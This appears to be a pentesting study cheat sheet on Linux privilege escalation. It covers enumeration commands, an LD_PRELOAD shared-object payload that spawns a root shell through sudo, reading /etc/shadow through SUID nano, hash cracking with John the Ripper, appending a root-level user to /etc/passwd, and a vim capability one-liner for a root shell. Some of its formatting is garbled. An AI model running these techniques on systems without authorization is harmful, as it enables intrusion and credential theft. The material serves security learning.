# üõ°Ô∏è Linux Privilege Escalation ‚Äì Core Techniques

> **Author:** Obada Hamed  
> **Scope:** Post-exploitation privilege escalation on Linux systems using common vectors.  
> **Focus:** Enumeration, Sudo, SUID, Capabilities

---

## üìç 1. Enumeration

**Goal:** After gaining initial access (often as a low-privileged user), the first step is to enumerate the system to discover potential privilege escalation vectors.

### üîß Key Commands

| Command | Description |
|---------|-------------|
| `hostname` | Displays the system's hostname. May hint at the machine's role. |
| `uname -a` | Shows kernel and system architecture info. Useful for kernel exploit checks. |
| `cat /proc/version` | Kernel version and compiler info (e.g., GCC presence). |
| `cat /etc/issue` | OS identification (can be customized). |
| `ps aux`, `ps -A`, `ps axjf` | Lists running processes. Look for unusual or high-privilege processes. |
| `env` | Displays environment variables. Check for PATH, Python, GCC, etc. |
| `sudo -l` | Lists commands the current user can run with sudo. |
| `ls -la` | Lists files, including hidden ones, with permissions. |
| `id` | Shows current user ID and group memberships. |
| `cat /etc/passwd` | Lists system users. Use `grep /home` to filter real users. |
| `history` | View command history. May reveal credentials or useful commands. |
| `ifconfig`, `ip route` | Network interfaces and routing info. Useful for pivoting. |
| `netstat -a`, `-l`, `-tp` | Active connections and listening ports. |
| `find` | Search for files, permissions, SUID, writable folders, etc. |

---

## üîê 2. Privilege Escalation via `sudo`

### üîç Check Permissions

``` bash
sudo -l
```
Look for commands that can be run without a password (NOPASSWD) or with environment variables preserved.

üß™ Exploiting LD_PRELOAD
If LD_PRELOAD is allowed and a binary like find is available via sudo, you can preload a malicious shared object to escalate privileges.

1. Create the C payload:
``` c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
2. Compile to shared object:
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
3. Execute with sudo:
```bash
sudo LD_PRELOAD=/full/path/to/shell.so find
```
‚ö†Ô∏è Ensure the binary is allowed in sudo -l and that env_keep+=LD_PRELOAD is enabled.

üß® 3. Privilege Escalation via SUID
üîç Find SUID Binaries
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
‚úÖ Exploit Known Binaries
Use GTFOBins ‚Äì SUID to check if any of the binaries are exploitable.

Example: nano with SUID
bash
nano /etc/shadow
You can now read password hashes.

üßÇ Crack Passwords with John the Ripper
``bash
unshadow passwd.txt shadow.txt > passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```
üß® Add a Root User (Alternative to Cracking)
Generate a password hash:

```bash
openssl passwd -1 -salt aqua mypassword
```
Add a new user to /etc/passwd:

```bash
nano /etc/passwd
Append:
```
```Code
aqua:<hash>:0:0:root:/root:/bin/bash
```
Switch to the new user:
```bash
su aqua
```
‚öôÔ∏è 4. Privilege Escalation via Capabilities
Linux capabilities allow fine-grained privilege assignment to binaries without full root access.

üîç Find Capabilities
```bash
getcap -r / 2>/dev/null
```
‚úÖ Exploit Known Capable Binaries
Check GTFOBins ‚Äì Capabilities (gtfobins.github.io in Bing) for exploitable binaries.

Example: vim with cap_setuid+ep
```bash
vim -c ':py3 import os; os.setuid(0); os.system("/bin/bash")'
```
This spawns a root shell if the binary is owned by root and has the right capability.
